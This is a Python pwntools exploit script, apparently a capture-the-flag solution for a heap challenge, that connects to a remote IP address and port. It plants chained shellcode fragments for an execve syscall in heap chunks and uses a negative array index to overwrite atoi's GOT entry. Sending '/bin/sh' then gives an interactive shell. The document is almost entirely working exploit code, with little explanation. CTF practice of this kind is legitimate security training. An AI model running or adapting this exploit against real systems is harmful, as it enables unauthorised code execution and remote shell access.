from pwn import *  
  
#sh = process('./pwnh21')  
sh = remote("61.147.171.105",62194)  
  
context(os='linux',arch='amd64')  
def create(index,size,content):  
   sh.sendlineafter('your choice>>','1')  
   sh.sendlineafter('index:',str(index))  
   sh.sendlineafter('size:',str(size))  
   sh.sendafter('content:',content)  
  
def delete(index):  
   sh.sendlineafter('your choice>>','4')  
   sh.sendlineafter('index:',str(index))  
  
#rax = 0 jmp short next_chunk  
code0 = (asm('xor rax,rax') + b'\x90\x90\xeb\x19')  
#rax = 0x3B jmp short next_chunk  
code1= (asm('mov eax,0x3B') + b'\xeb\x19')  
#rsi = 0 jmp short next_chunk  
code2 = (asm('xor rsi,rsi') + b'\x90\x90\xeb\x19')  
#rdi = 0 jmp short next_chunk  
code3 = (asm('xor rdx,rdx') + b'\x90\x90\xeb\x19')  
#系统调用  
code4 = (asm('syscall').ljust(7,b'\x90'))  
  
# '''''print len(code0) 
# print len(code1) 
# print len(code2) 
# print len(code3) 
# print len(code4) 
# '''  
  
create(0,8,b'a'*7)  
create(1,8,code1)  
create(2,8,code2)  
create(3,8,code3)  
create(4,8,code4)  
#删除第一个堆块  
delete(0)  
  
#把第一个堆块申请回来，存入指令，并且把堆指针赋值给数组的-8下标处(atoi的GOT表处)，即修改了atoi的GOT表  
create(-8,8,code0)  
#getshell  
sh.sendlineafter('your choice>>','/bin/sh')  
  
sh.interactive()  